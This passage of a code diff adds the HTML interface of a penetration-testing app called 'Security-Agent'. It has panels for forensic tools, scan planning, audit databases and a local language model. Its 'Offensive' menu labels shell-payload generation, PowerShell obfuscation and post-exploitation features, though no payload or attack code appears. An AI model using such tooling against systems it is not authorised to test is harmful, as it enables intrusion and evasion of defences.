@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self';">
+    <title>Security-Agent</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div id="app">
+        <!-- Sidebar -->
+        <nav id="sidebar">
+            <div class="sidebar-header">
+                <div class="logo">
+                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    </svg>
+                </div>
+                <div class="logo-text">
+                    <span class="app-name">Security-Agent</span>
+                    <span class="app-version">v0.1.0</span>
+                </div>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="section-label">Overview</div>
+                <button class="nav-item active" data-panel="dashboard">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg>
+                    <span>Dashboard</span>
+                </button>
+                <button class="nav-item" data-panel="status">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>
+                    <span>System Status</span>
+                </button>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="section-label">Tools</div>
+                <button class="nav-item" data-panel="tools">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg>
+                    <span>Run Tool</span>
+                </button>
+                <button class="nav-item" data-panel="skills">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>
+                    <span>Skills</span>
+                </button>
+                <button class="nav-item" data-panel="external">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+                    <span>External Tool</span>
+                </button>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="section-label">Engagement</div>
+                <button class="nav-item" data-panel="plan-scan">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                    <span>Plan Scan</span>
+                </button>
+                <button class="nav-item" data-panel="findings">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+                    <span>Findings</span>
+                </button>
+                <button class="nav-item" data-panel="retest">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="23 4 23 10 17 10"/><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"/></svg>
+                    <span>Schedule Retest</span>
+                </button>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="section-label">Data</div>
+                <button class="nav-item" data-panel="audit">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 20h9"/><path d="M16.5 3.5a2.121 2.121 0 0 1 3 3L7 19l-4 1 1-4L16.5 3.5z"/></svg>
+                    <span>Audit Log</span>
+                </button>
+                <button class="nav-item" data-panel="audit-db">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+                    <span>Audit Database</span>
+                </button>
+                <button class="nav-item" data-panel="findings-db">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+                    <span>Findings Database</span>
+                </button>
+                <button class="nav-item" data-panel="calibration-db">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06A1.65 1.65 0 0 0 4.68 15a1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06A1.65 1.65 0 0 0 9 4.68a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
+                    <span>Calibration DB</span>
+                </button>
+                <button class="nav-item" data-panel="reasoning-db">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                    <span>Reasoning Log</span>
+                </button>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="section-label">Intelligence</div>
+                <button class="nav-item" data-panel="llm-generate">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
+                    <span>Generate Text</span>
+                </button>
+                <button class="nav-item" data-panel="llm-anomaly">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                    <span>Anomaly Score</span>
+                </button>
+                <button class="nav-item" data-panel="ask">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
+                    <span>Ask (NLU)</span>
+                </button>
+            </div>
+
+            <div class="sidebar-section">
+                <div class="section-label">Offensive</div>
+                <button class="nav-item" data-panel="offensive-hash">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="4" y1="9" x2="20" y2="9"/><line x1="4" y1="15" x2="20" y2="15"/><line x1="10" y1="3" x2="8" y2="21"/><line x1="16" y1="3" x2="14" y2="21"/></svg>
+                    <span>Hash ID</span>
+                </button>
+                <button class="nav-item" data-panel="offensive-password">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+                    <span>Password Strength</span>
+                </button>
+                <button class="nav-item" data-panel="offensive-wordlist">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+                    <span>Gen Wordlist</span>
+                </button>
+                <button class="nav-item" data-panel="offensive-shell">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+                    <span>Gen Shell Payload</span>
+                </button>
+                <button class="nav-item" data-panel="offensive-payload">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                    <span>Analyze Payload</span>
+                </button>
+                <button class="nav-item" data-panel="offensive-evasion">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                    <span>PS Obfuscation</span>
+                </button>
+                <button class="nav-item" data-panel="offensive-wireless">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
+                    <span>Wireless Audit</span>
+                </button>
+                <button class="nav-item" data-panel="offensive-postexploit">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9"/><path d="M13.73 21a2 2 0 0 1-3.46 0"/></svg>
+                    <span>Post-Exploit</span>
+                </button>
+            </div>
+
+            <div class="sidebar-footer">
+                <button class="nav-item" data-panel="about">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                    <span>About</span>
+                </button>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main id="main-content">
+            <!-- Binary Warning Banner -->
+            <div id="binary-warning" class="binary-warning" style="display:none;">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                <span>security-agent binary not found. Run <code>make build</code> first, or place the binary in <code>target/release/</code>.</span>
+            </div>
+            <!-- Dashboard Panel -->
+            <section class="panel active" id="panel-dashboard">
+                <div class="panel-header">
+                    <h1>Dashboard</h1>
+                    <p class="subtitle">Security-Agent orchestration overview</p>
+                </div>
+                <div class="dashboard-grid">
+                    <div class="stat-card" id="stat-binary">
+                        <div class="stat-icon green"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg></div>
+                        <div class="stat-body">
+                            <div class="stat-value" id="binary-status">Checking...</div>
+                            <div class="stat-label">Binary Status</div>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon blue"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/></svg></div>
+                        <div class="stat-body">
+                            <div class="stat-value" id="tools-count">--</div>
+                            <div class="stat-label">Cataloged Tools</div>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon purple"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg></div>
+                        <div class="stat-body">
+                            <div class="stat-value" id="skills-count">--</div>
+                            <div class="stat-label">Embedded Skills</div>
+                        </div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-icon orange"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+                        <div class="stat-body">
+                            <div class="stat-value" id="coverage-status">--</div>
+                            <div class="stat-label">Capability Coverage</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="dashboard-quick-actions">
+                    <h3>Quick Actions</h3>
+                    <div class="action-grid">
+                        <button class="action-btn" data-panel="tools"><span class="action-icon">&#9889;</span>Run a Tool</button>
+                        <button class="action-btn" data-panel="plan-scan"><span class="action-icon">&#128269;</span>Plan a Scan</button>
+                        <button class="action-btn" data-panel="ask"><span class="action-icon">&#128172;</span>Ask in Plain English</button>
+                        <button class="action-btn" data-panel="skills"><span class="action-icon">&#128218;</span>Browse Skills</button>
+                    </div>
+                </div>
+            </section>
+
+            <!-- System Status Panel -->
+            <section class="panel" id="panel-status">
+                <div class="panel-header">
+                    <h1>System Status</h1>
+                    <p class="subtitle">Offline status and capability health</p>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-refresh-status">Refresh Status</button>
+                </div>
+                <div class="output-block" id="output-status">
+                    <div class="empty-state">Click "Refresh Status" to load system status.</div>
+                </div>
+            </section>
+
+            <!-- Run Tool Panel -->
+            <section class="panel" id="panel-tools">
+                <div class="panel-header">
+                    <h1>Run Built-in Tool</h1>
+                    <p class="subtitle">Execute an offline local analyzer</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="tool-name">Tool</label>
+                        <select id="tool-name">
+                            <option value="autopsy">autopsy</option>
+                            <option value="volatility">volatility</option>
+                            <option value="wireshark">wireshark</option>
+                            <option value="binwalk">binwalk</option>
+                            <option value="foremost">foremost</option>
+                            <option value="bulk_extractor">bulk_extractor</option>
+                            <option value="hashdeep">hashdeep</option>
+                        </select>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="tool-input-path">Input Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="tool-input-path" placeholder="/path/to/input/file">
+                            <button class="btn secondary" id="btn-browse-tool-input">Browse</button>
+                        </div>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="tool-output-path">Output .txt Path <span class="optional">(optional)</span></label>
+                        <div class="input-with-button">
+                            <input type="text" id="tool-output-path" placeholder="/path/to/output.txt">
+                            <button class="btn secondary" id="btn-browse-tool-output">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-run-tool">Run Tool</button>
+                </div>
+                <div class="output-block" id="output-tools">
+                    <div class="empty-state">Select a tool and input path, then click Run.</div>
+                </div>
+            </section>
+
+            <!-- Skills Panel -->
+            <section class="panel" id="panel-skills">
+                <div class="panel-header">
+                    <h1>Skills</h1>
+                    <p class="subtitle">Browse and inspect embedded skill definitions</p>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-list-skills">Load Skills</button>
+                    <div class="search-input" style="flex:1;margin-left:8px;">
+                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                        <input type="text" id="skill-search" placeholder="Filter skills...">
+                    </div>
+                </div>
+                <div class="skill-layout">
+                    <div class="skill-list" id="skill-list">
+                        <div class="empty-state">Click "Load Skills" to see available skills.</div>
+                    </div>
+                    <div class="skill-detail" id="skill-detail">
+                        <div class="empty-state">Select a skill to view its definition.</div>
+                    </div>
+                </div>
+            </section>
+
+            <!-- External Tool Panel -->
+            <section class="panel" id="panel-external">
+                <div class="panel-header">
+                    <h1>Run External Tool</h1>
+                    <p class="subtitle">Execute a locally installed cataloged tool</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="ext-tool-name">Tool Name</label>
+                        <input type="text" id="ext-tool-name" placeholder="e.g. nmap, semgrep, sqlmap">
+                    </div>
+                    <div class="form-group">
+                        <label for="ext-tool-args">Arguments</label>
+                        <input type="text" id="ext-tool-args" placeholder="space-separated arguments">
+                    </div>
+                    <div class="form-group full-width">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="ext-allow-network">
+                            <span>Allow live network / active testing (--allow-network)</span>
+                        </label>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-run-external">Run External Tool</button>
+                </div>
+                <div class="output-block" id="output-external">
+                    <div class="empty-state">Configure the tool and click Run.</div>
+                </div>
+            </section>
+
+            <!-- Plan Scan Panel -->
+            <section class="panel" id="panel-plan-scan">
+                <div class="panel-header">
+                    <h1>Plan a Scan</h1>
+                    <p class="subtitle">Configure and plan an engagement scan</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="plan-config-path">Engagement Config Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="plan-config-path" placeholder="/path/to/engagement.json">
+                            <button class="btn secondary" id="btn-browse-plan-config">Browse</button>
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="plan-audit-log">Audit Log Path <span class="optional">(optional)</span></label>
+                        <input type="text" id="plan-audit-log" placeholder="/path/to/audit.jsonl">
+                    </div>
+                    <div class="form-group">
+                        <label for="plan-audit-db">Audit Database <span class="optional">(optional)</span></label>
+                        <input type="text" id="plan-audit-db" placeholder="/path/to/audit.sadb">
+                    </div>
+                    <div class="form-group">
+                        <label for="plan-memory">Memory Log <span class="optional">(optional)</span></label>
+                        <input type="text" id="plan-memory" placeholder="/path/to/memory.jsonl">
+                    </div>
+                    <div class="form-group">
+                        <label for="plan-calibration-db">Calibration DB <span class="optional">(optional)</span></label>
+                        <input type="text" id="plan-calibration-db" placeholder="/path/to/calibration.sadb">
+                    </div>
+                    <div class="form-group full-width">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="plan-cognitive-review">
+                            <span>Run cognitive review (--cognitive-review)</span>
+                        </label>
+                    </div>
+                    <div class="form-group full-width">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="plan-execute">
+                            <span>Execute approved tools now (--execute)</span>
+                        </label>
+                    </div>
+                    <div class="form-group full-width conditional" id="plan-execute-options" style="display:none;">
+                        <label class="checkbox-label">
+                            <input type="checkbox" id="plan-allow-network">
+                            <span>Allow network / active tools for execution</span>
+                        </label>
+                        <div class="form-group" style="margin-top:8px;">
+                            <label for="plan-exec-args">Tool Arguments <span class="optional">(optional)</span></label>
+                            <input type="text" id="plan-exec-args" placeholder="space-separated arguments">
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-plan-scan">Plan Scan</button>
+                </div>
+                <div class="output-block" id="output-plan-scan">
+                    <div class="empty-state">Configure the engagement and click Plan Scan.</div>
+                </div>
+            </section>
+
+            <!-- Findings Panel -->
+            <section class="panel" id="panel-findings">
+                <div class="panel-header">
+                    <h1>Record Findings</h1>
+                    <p class="subtitle">Merge findings from a source log into a destination</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="findings-dest">Destination Findings Log</label>
+                        <div class="input-with-button">
+                            <input type="text" id="findings-dest" placeholder="/path/to/destination.jsonl">
+                            <button class="btn secondary" id="btn-browse-findings-dest">Browse</button>
+                        </div>
+                    </div>
+                    <div class="form-group full-width">
+                        <label for="findings-src">Source Findings Log</label>
+                        <div class="input-with-button">
+                            <input type="text" id="findings-src" placeholder="/path/to/source.jsonl">
+                            <button class="btn secondary" id="btn-browse-findings-src">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-record-findings">Record Findings</button>
+                </div>
+                <div class="output-block" id="output-findings">
+                    <div class="empty-state">Select source and destination, then click Record.</div>
+                </div>
+            </section>
+
+            <!-- Schedule Retest Panel -->
+            <section class="panel" id="panel-retest">
+                <div class="panel-header">
+                    <h1>Schedule Retest</h1>
+                    <p class="subtitle">Generate a retest schedule from a findings log</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="retest-path">Findings Log Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="retest-path" placeholder="/path/to/findings.jsonl">
+                            <button class="btn secondary" id="btn-browse-retest">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-schedule-retest">Schedule Retest</button>
+                </div>
+                <div class="output-block" id="output-retest">
+                    <div class="empty-state">Select a findings log, then click Schedule Retest.</div>
+                </div>
+            </section>
+
+            <!-- Audit Log Panel -->
+            <section class="panel" id="panel-audit">
+                <div class="panel-header">
+                    <h1>Audit Log</h1>
+                    <p class="subtitle">View persisted audit records</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="audit-log-path">Audit Log Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="audit-log-path" placeholder="/path/to/audit.jsonl">
+                            <button class="btn secondary" id="btn-browse-audit-log">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-view-audit">View Audit Log</button>
+                </div>
+                <div class="output-block" id="output-audit">
+                    <div class="empty-state">Select an audit log file, then click View.</div>
+                </div>
+            </section>
+
+            <!-- Audit Database Panel -->
+            <section class="panel" id="panel-audit-db">
+                <div class="panel-header">
+                    <h1>Audit Database</h1>
+                    <p class="subtitle">View the .sadb audit database</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="audit-db-path">Audit Database Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="audit-db-path" placeholder="/path/to/audit.sadb">
+                            <button class="btn secondary" id="btn-browse-audit-db">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-view-audit-db">View Audit Database</button>
+                </div>
+                <div class="output-block" id="output-audit-db">
+                    <div class="empty-state">Select an audit database file, then click View.</div>
+                </div>
+            </section>
+
+            <!-- Findings Database Panel -->
+            <section class="panel" id="panel-findings-db">
+                <div class="panel-header">
+                    <h1>Findings Database</h1>
+                    <p class="subtitle">View the .sadb findings database</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="findings-db-path">Findings Database Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="findings-db-path" placeholder="/path/to/findings.sadb">
+                            <button class="btn secondary" id="btn-browse-findings-db">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-view-findings-db">View Findings Database</button>
+                </div>
+                <div class="output-block" id="output-findings-db">
+                    <div class="empty-state">Select a findings database file, then click View.</div>
+                </div>
+            </section>
+
+            <!-- Calibration Database Panel -->
+            <section class="panel" id="panel-calibration-db">
+                <div class="panel-header">
+                    <h1>Calibration Database</h1>
+                    <p class="subtitle">View the .sadb calibration database</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="calibration-db-path">Calibration Database Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="calibration-db-path" placeholder="/path/to/calibration.sadb">
+                            <button class="btn secondary" id="btn-browse-calibration-db">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-view-calibration-db">View Calibration Database</button>
+                </div>
+                <div class="output-block" id="output-calibration-db">
+                    <div class="empty-state">Select a calibration database file, then click View.</div>
+                </div>
+            </section>
+
+            <!-- Reasoning Log Panel -->
+            <section class="panel" id="panel-reasoning-db">
+                <div class="panel-header">
+                    <h1>Reasoning Log Database</h1>
+                    <p class="subtitle">View the .sadb reasoning chain archive</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="reasoning-db-path">Reasoning Log Database Path</label>
+                        <div class="input-with-button">
+                            <input type="text" id="reasoning-db-path" placeholder="/path/to/reasoning.sadb">
+                            <button class="btn secondary" id="btn-browse-reasoning-db">Browse</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-view-reasoning-db">View Reasoning Log</button>
+                </div>
+                <div class="output-block" id="output-reasoning-db">
+                    <div class="empty-state">Select a reasoning log database file, then click View.</div>
+                </div>
+            </section>
+
+            <!-- LLM Generate Panel -->
+            <section class="panel" id="panel-llm-generate">
+                <div class="panel-header">
+                    <h1>Generate Text (LLM)</h1>
+                    <p class="subtitle">Generate text using the built-in language model</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="llm-gen-prompt">Prompt</label>
+                        <textarea id="llm-gen-prompt" rows="4" placeholder="Enter a prompt for text generation..."></textarea>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-llm-generate">Generate</button>
+                </div>
+                <div class="output-block" id="output-llm-generate">
+                    <div class="empty-state">Enter a prompt and click Generate.</div>
+                </div>
+            </section>
+
+            <!-- LLM Anomaly Panel -->
+            <section class="panel" id="panel-llm-anomaly">
+                <div class="panel-header">
+                    <h1>Anomaly Score (LLM)</h1>
+                    <p class="subtitle">Score text for anomalous content</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="llm-anomaly-text">Text to Score</label>
+                        <textarea id="llm-anomaly-text" rows="4" placeholder="Enter text to score for anomalies..."></textarea>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-llm-anomaly">Score for Anomaly</button>
+                </div>
+                <div class="output-block" id="output-llm-anomaly">
+                    <div class="empty-state">Enter text and click Score for Anomaly.</div>
+                </div>
+            </section>
+
+            <!-- Ask (NLU) Panel -->
+            <section class="panel" id="panel-ask">
+                <div class="panel-header">
+                    <h1>Ask (Natural Language)</h1>
+                    <p class="subtitle">Ask a plain-English question, routed through the NLU engine</p>
+                </div>
+                <div class="form-grid">
+                    <div class="form-group full-width">
+                        <label for="ask-input">Your Instruction</label>
+                        <textarea id="ask-input" rows="4" placeholder="e.g. What tools do you have? / Are you healthy? / Generate text about scanning..."></textarea>
+                    </div>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-ask">Ask</button>
+                </div>
+                <div class="output-block" id="output-ask">
+                    <div class="empty-state">Type a question in plain English and click Ask.</div>
+                </div>
+            </section>
+
+            <!-- About Panel -->
+            <section class="panel" id="panel-about">
+                <div class="panel-header">
+                    <h1>About</h1>
+                    <p class="subtitle">Mission statement and roadmap</p>
+                </div>
+                <div class="action-bar">
+                    <button class="btn primary" id="btn-about">Load About</button>
+                </div>
+                <div class="output-block" id="output-about">
+                    <div class="empty-state">Click Load About to view mission and roadmap.</div>
+                </div>
+            </section>
+
+            <!-- ═══════════════════════════════════════════════════════════════
+                 Offensive Toolkit Panels
+                 ═══════════════════════════════════════════════════════════════ -->
+
+            <!-- Hash ID Panel -->
+            <section class="panel" id="panel-offensive-hash">
+                <div class="panel-header">
+                    <h1>Hash Identification</h1>
+                    <p class="subtitle">Identify hash type and suggest cracking tools</p>
+                </div>
